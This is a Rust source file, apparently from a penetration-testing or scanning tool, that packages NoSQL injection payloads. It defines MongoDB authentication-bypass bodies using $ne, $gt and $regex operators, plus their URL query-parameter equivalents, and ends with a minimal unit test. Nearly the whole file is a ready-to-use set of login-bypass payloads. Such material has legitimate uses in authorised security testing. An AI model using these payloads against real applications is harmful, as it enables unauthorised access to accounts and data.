//! NoSQL injection payloads

/// NoSQL payload
#[derive(Debug, Clone)]
pub struct NosqlPayload {
    pub name: String,
    pub payload: serde_json::Value,
}

impl NosqlPayload {
    pub fn new(name: &str, payload: serde_json::Value) -> Self {
        Self {
            name: name.to_string(),
            payload,
        }
    }
}

/// MongoDB auth bypass payloads
pub fn mongo_auth_bypass() -> Vec<NosqlPayload> {
    vec![
        NosqlPayload::new(
            "$ne bypass",
            serde_json::json!({"username": {"$ne": ""}, "password": {"$ne": ""}}),
        ),
        NosqlPayload::new(
            "$gt bypass",
            serde_json::json!({"username": {"$gt": ""}, "password": {"$gt": ""}}),
        ),
        NosqlPayload::new(
            "$regex bypass",
            serde_json::json!({"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}),
        ),
    ]
}

/// Generate URL query param NoSQL injection
pub fn url_query_injection() -> Vec<String> {
    vec![
        "username[$ne]=&password[$ne]=".to_string(),
        "username[$gt]=&password[$gt]=".to_string(),
        "username[$regex]=.*&password[$regex]=.*".to_string(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mongo_auth_bypass() {
        let payloads = mongo_auth_bypass();
        assert!(!payloads.is_empty());
    }
}
